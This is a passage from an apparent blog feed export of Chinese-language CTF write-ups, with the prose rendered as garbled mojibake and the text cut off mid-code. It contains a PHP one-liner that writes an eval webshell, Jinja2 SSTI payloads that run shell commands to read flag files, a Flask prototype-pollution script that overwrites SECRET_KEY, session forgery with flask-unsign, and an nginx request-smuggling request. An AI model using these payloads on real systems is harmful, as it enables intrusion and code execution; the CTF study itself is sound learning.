threading.Thread(target=read,args=(sess,)).start()</span><br></pre></td></tr></table></figure><p>å…ˆè¯•äº†æœ€ç®€å•çš„phpinfoï¼Œç›´æ¥å°±æ‹¿åˆ°äº†flagï¼Œç„¶ådisable_functionsæŠŠå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½ç»™banäº†ï¼æˆ‘ç”¨scandiræ‰«æäº†ç›®å½•&#x2F;var&#x2F;log&#x2F;ä¸‹æ²¡æœ‰nginxä½†æ˜¯æœ‰ä¸ªapache2è¿™å°±ä¸æ‡‚äº†ï¼Œç„¶ååˆè¯•äº†&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logï¼Œè¿™é‡Œé¢å¥½åƒæ²¡å†…å®¹</p><p>æœ€åå‘ç°è¿˜å¯ä»¥è¿™æ ·å†™é©¬ï¼Œåˆ©ç”¨fputså’Œfopen</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨èšå‰‘çš„æ’ä»¶ç»•è¿‡ä¸€ä¸‹å°±å¥½äº†</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> sessionåŒ…å« </tag>
            
            <tag> phpå†™é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSBCTFå•èº«æ¯2024</title>
      <link href="/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"/>
      <url>/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°Â·å¥½ç©çš„PHP"><a href="#ç­¾åˆ°Â·å¥½ç©çš„PHP" class="headerlink" title="ç­¾åˆ°Â·å¥½ç©çš„PHP"></a>ç­¾åˆ°Â·å¥½ç©çš„PHP</h2><p>å°è€ƒç‚¹ï¼šæ•°å­—123å’Œå­—ç¬¦ä¸²123çš„md5æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¼ºæ¯”è¾ƒä¸ä¸€æ ·</p><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>sstiæœ‰é•¿åº¦é™åˆ¶</p><p>åˆ©ç”¨<code>config</code>æ˜¯å­—å…¸çš„å­ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨updateæ–¹æ³•å°†æˆ‘ä»¬è¦å†™çš„payloadç»™å‚¨å­˜åˆ°configé‡Œé¢ï¼Œç„¶åå†å–å‡ºæ¥</p><p>ç›®æ ‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">%set x=config.update(a=lipsum.__globals__)%&#125;#é•¿åº¦å¤ªé•¿äº†</span></span><br><span class="line">å¯ä»¥å…ˆæŠŠconfig.updateç»™å­˜ä¸€ä¸‹</span><br><span class="line">&#123;<span class="comment">%set x=config.update(a=config.update)%&#125;</span></span><br><span class="line">&#123;<span class="comment">%set x=config.a(b=lipsum.__globals__)%&#125;</span></span><br><span class="line">&#123;&#123;config.b.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p>æ³¨å†Œè¿›å»</p><p><img src="/../images/achieve/2025/11/image-20251129185509255.png" alt="image-20251129185509255"></p><p><img src="/../images/achieve/2025/11/image-20251129185541908.png" alt="image-20251129185541908"></p><p>æç¤ºè¯´åˆ©ç”¨æ³¨å†Œå»è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œè€Œä¸”æåˆ°äº†èº«ä»½ï¼Œæˆ‘ä»¬çœ‹çœ‹cookie</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdzUsKhDAQANGrhF4biPmM4lmE0GpnzCIJpBUR8e46U4u3rQtoXotPxIxfggHOsleBmQ-qIrL4147bvAVey3GpT6fIYC9t6PBlWmRvrZKatDPBOQra3GOGBiJ7XFLMMKgGdqaaMf0GrTZwP<span class="built_in">_</span>zzJOE.aSrQ5w.ktXLaj3P75GzmyN1QiItSA52NcI</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯sessionï¼Œå¤§æŠµå°±æ˜¯flaskçš„sessionä¼ªé€ äº†ï¼Œå¯†é’¥æç¤ºæˆ‘ä»¬å»æ±¡æŸ“<code>app.config.SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://2ee11bb0-05f6-4dda-865c-21b1c010b233.challenge.ctf.show/register&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;SECRET_KEY&quot;</span>:<span class="string">&quot;rufeii&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,json=payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¼ªé€ session</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;is<span class="built_in">_</span>admin&#x27;: 1, &#x27;username&#x27;: &#x27;1&#x27;&#125;&quot; --secret &#x27;rufeii&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251129191712309.png" alt="image-20251129191712309"></p><p>ä¹‹åå°±æ˜¯sstiä¸éœ€è¦<code>&#123;&#123;&#125;&#125;</code>ï¼Œåº”è¯¥å°±è¿‡æ»¤äº†ç‚¹å…³é”®å­—å¾ˆå¥½æ‰“</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;nl /f*&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>æ±¡æŸ“çš„æ—¶å€™ç›´æ¥å°è¯•æ±¡æŸ“é™æ€ç›®å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b889b74-472b-4490-8994-17e02fe934b1.challenge.ctf.show/register&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘æŠŠæºç æ‹¿äº†ä¸€ä¸‹&#x2F;var&#x2F;www&#x2F;html&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, session, request, redirect, url_for, render_template, render_template_string, jsonify</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> waf, key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®SECRET_KEY</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;ctfshow5201314&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">valid_urls = [<span class="string">&#x27;/logout&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/echo&#x27;</span>, <span class="string">&#x27;/secret&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>, <span class="string">&#x27;/chat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.is_admin = <span class="number">0</span>  <span class="comment"># ä¹Ÿå¯ä»¥è®¾ç½®é»˜è®¤çš„ is_admin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨ç”¨äºéªŒè¯ URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_valid_url</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">not</span> <span class="keyword">in</span> valid_urls:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access denied&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    wrapper.__name__ = f.__name__  <span class="comment"># ä¿æŒè§†å›¾å‡½æ•°åç§°</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:  <span class="comment"># å¤„ç† JSON è¯·æ±‚</span></span><br><span class="line">            username = request.json.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">            password = request.json.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username already exists&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            ctfer = CTFer(username, password)</span><br><span class="line">            merge(request.json, ctfer)</span><br><span class="line">            users[ctfer.username] = &#123;<span class="string">&#x27;password&#x27;</span>: ctfer.password, <span class="string">&#x27;is_admin&#x27;</span>: ctfer.is_admin&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Yeah~ You succeeded!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤„ç†è¡¨å•è¯·æ±‚</span></span><br><span class="line">        data = request.form.to_dict(flat=<span class="literal">False</span>)</span><br><span class="line">        username = data.get(<span class="string">&#x27;username&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        password = data.get(<span class="string">&#x27;password&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Username already exists&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = users[username][<span class="string">&#x27;is_admin&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid credentials&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chat&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;chat.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            secret_content = file.read()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>, secret_content=secret_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;access_denied.html&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/echo&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>():</span><br><span class="line">    message = request.form.get(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">    session[<span class="string">&#x27;echo_message&#x27;</span>] = message</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> key(message):</span><br><span class="line">            <span class="keyword">if</span> waf(message):</span><br><span class="line">                template = <span class="string">&#x27;your answer is &#123;&#123;%s&#125;&#125;&#x27;</span> % session[<span class="string">&#x27;echo_message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                    session[<span class="string">&#x27;echo_message&#x27;</span>] = render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;echo_message&#x27;</span>] = <span class="string">&#x27;You can bypass it!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="è¿·é›¾é‡é‡"><a href="#è¿·é›¾é‡é‡" class="headerlink" title="è¿·é›¾é‡é‡"></a>è¿·é›¾é‡é‡</h2><p>phpçš„é¢˜ç›®ä¸æ˜¯è®­ç»ƒçš„é‡ç‚¹ï¼Œä¸æƒ³å†™</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sstié•¿åº¦é™åˆ¶ </tag>
            
            <tag> flaskåŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024èœ€é“å±±</title>
      <link href="/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/"/>
      <url>/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/</url>
      
        <content type="html"><![CDATA[<p>ç›´æ¥å¼€æ‰“</p><h2 id="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"><a href="#æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°" class="headerlink" title="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"></a>æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°</h2><p>hint:</p><p>è¿™æ˜¯ä¸€ä¸ªæµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°ï¼Œä½ çš„ä»»åŠ¡æ˜¯åˆ¤æ–­æ‰€ç»™å›¾ç‰‡èƒ½å¦è¿›å…¥å¢ƒå†…ï¼Œä½†æ˜¯å…¨éƒ¨åˆ¤æ–­æ­£ç¡®çš„æˆåŠŸé¡µé¢å¥½åƒä¸¢å¤±äº†ï¼Ÿï¼Ÿflagåœ¨å†…ç½‘çš„<a href="http://infernityhost/flag.html">http://infernityhost/flag.html</a></p><p>ç½‘é¡µæºç æ‹¿&#x2F;errorè·¯ç”±ï¼Œç›´æ¥è®¿é—®æœ‰é‡å®šå‘ï¼ŒæŠ“åŒ…å‘ç°nginx&#x2F;1.17.6ï¼Œä¸Šç½‘æ‰¾åˆ°</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/null1433/p/12778026.html</span><br></pre></td></tr></table></figure><p>è¯·æ±‚èµ°ç§ï¼Œæ”¹ä¸‹host</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.htm; HTTP/1.1</span><br><span class="line">Host: inferbityhost</span><br></pre></td></tr></table></figure><h2 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a>my_site</h2><p>ç»™å‡ºæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 